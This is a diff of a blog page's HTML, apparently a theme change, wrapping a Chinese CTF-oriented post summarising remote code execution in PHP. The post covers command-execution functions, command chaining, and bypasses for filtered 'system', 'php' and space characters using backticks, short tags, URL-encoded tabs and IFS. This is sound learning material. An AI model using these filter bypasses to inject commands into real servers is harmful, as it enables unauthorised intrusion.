@@ -1,22 +1,24 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=dark>
-
-
-
+<html lang="zh-CN">
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
-  <link rel="icon" href="/img/fav.ico">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="Sl0th">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="RCE总结定义RCE，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 命令执行函数system()system()函数会调用fork()产生子进程，由子进程调用&#x2F;bin&#x2F;sh -c command执行特定的命令，暂停当前进程直到command命令执行完毕，当此命令执行完后随即返回原调用的进程。 当system()正常执行，将返回命令的退出码； 当返回">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Sl0th">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://sloth31.github.io/2022/07/03/rce总结/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="RCE总结定义RCE，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 命令执行函数system()system()函数会调用fork()产生子进程，由子进程调用&#x2F;bin&#x2F;sh -c command执行特定的命令，暂停当前进程直到command命令执行完毕，当此命令执行完后随即返回原调用的进程。 当system()正常执行，将返回命令的退出码； 当返回">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCE总结">
 <meta property="og:url" content="http://sloth31.github.io/2022/07/03/RCE%E6%80%BB%E7%BB%93/index.html">
@@ -34,283 +36,504 @@
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="php">
 <meta property="article:tag" content="rce">
-<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032329169.jpg">
-  
-  
-  
-  <title>RCE总结 | Sl0th&#39;s Blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="/css/macpanel.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"sloth31.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"c8LjkMGtqBFlFQrpl65qUKoM-gzGzoHsz","app_key":"5MBWFG00GDY2LpteTo0bvyRu","server_url":"https://c8ljkmgt.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-  
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/img/fav.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/img/fav.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/img/fav.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            RCE总结 | Sl0th&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
 
 
+    <!--- Inject Part-->
+    
 
-  
-<meta name="generator" content="Hexo 6.1.0"></head>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"sloth31.github.io","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/img/night.jpg","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/img/day.jpg","dark":"/img/night.jpg"},"title":"👋Welcome to Sl0th's Blog🎉","subtitle":{"text":["There is no royal road to learning"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#4D5356","dark":"#fff"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":"enable","style":"default","links":{"github":"https://github.com/sloth31","instagram":null,"zhihu":null,"twitter":null,"email":"z694081360@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.3","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/sloth31","Blog":"http://sl0th.top/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
-  
-
-  <header>
+<div class="progress-bar-container">
     
 
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>Sl0th&#39;s blog</strong>
-    </a>
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
 
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
 
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container flex flex-col justify-between min-h-dvh">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/img/fav.ico" class="w-full h-full rounded-sm">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Sl0th&#39;s Blog
+                
             </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="RCE总结"></span>
-          
         </div>
 
-        
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-07-03 23:29" pubdate>
-          2022年7月3日 晚上
-        </time>
-      </span>
-    
-  </div>
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
 
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          7.4k 字
-        
-      </span>
-    
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
 
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          42 分钟
-        
-      </span>
-    
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
-    
-  </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
 
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-        
-      </div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
 
-      
-    </div>
-  </div>
-</div>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-</div>
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
 
-  </header>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
 
-  <main>
-    
-      
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
 
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">RCE总结</h1>
-            
-            
-              <div class="markdown-body">
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/sloth31">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="http://sl0th.top/">
+                                                    BLOG
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
                 
-                <h1 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>RCE，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/sloth31">GITHUB</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="http://sl0th.top/">BLOG</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">27</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">44</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">RCE总结</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/img/avatar.JPG">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Sl0th</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2022-07-03 23:29:09</span>
+        <span class="mobile">2022-07-03 23:29:09</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-07-03 23:30:38</span>
+            <span class="mobile">2024-07-03 23:30:38</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/ctf/">ctf</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/php/">php</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/rce/">rce</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>RCE，远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
 <h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h3><p>system()函数会调用fork()产生子进程，由子进程调用<code>/bin/sh -c command</code>执行特定的命令，暂停当前进程直到command命令执行完毕，当此命令执行完后随即返回原调用的进程。</p>
 <p>当system()正常执行，将返回命令的退出码；</p>
 <p>当返回值为127，相当于执行了exit函数，而自身命令没有执行；</p>
@@ -319,10 +542,10 @@
 <p>exec执行command命令时，不会输出全部结果，而是返回结果的最后一行</p>
 <blockquote>
 <p>结果有多行时(如列目录时)要传入第二个参数接收，要求是数组</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-variable">$arr</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;ls&#x27;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 </blockquote>
 <h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a><strong>shell_exec()</strong></h3><p>在shell下执行，适用于Linux Macos，并且结果可以有多行，字符串方式返回，绕过执行过程中出错或无输出，返回NULL</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h3><p>passthru直接将结果输出，<u>不返回结果</u>(与system的区别)</p>
 <h2 id="系统命令拼接方式"><a href="#系统命令拼接方式" class="headerlink" title="系统命令拼接方式"></a>系统命令拼接方式</h2><ul>
@@ -334,7 +557,7 @@
 </ul>
 <h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><h3 id="php字符被过滤"><a href="#php字符被过滤" class="headerlink" title="php字符被过滤"></a>php字符被过滤</h3><p>使用短标签 <code>&lt;?= php代码 ?&gt; </code></p>
 <h3 id="system被过滤"><a href="#system被过滤" class="headerlink" title="system被过滤"></a>system被过滤</h3><p>使用反引号绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-keyword">echo</span> `ls /`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">echo</span> `ls /`; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><ul>
 <li><p>常见绕过方式有利用URL编码：%20、%09（tab）</p>
@@ -351,10 +574,10 @@
 <p>IFS默认值为 <space> <tab> <newline>3个</p>
 <p>IFS的作用就是把字符串里的某某字符（和它一样的字符）转义成分隔符。</p>
 <p>而空格被当作分隔符时会合并，因此直接echo含多个空格的变量，会去重连续的空格，若要保留，echo时加上双引号</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;$test&quot;<br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$test&quot;</span><br></pre></td></tr></table></figure></div>
 
 <p>可以对IFS重新赋值</p>
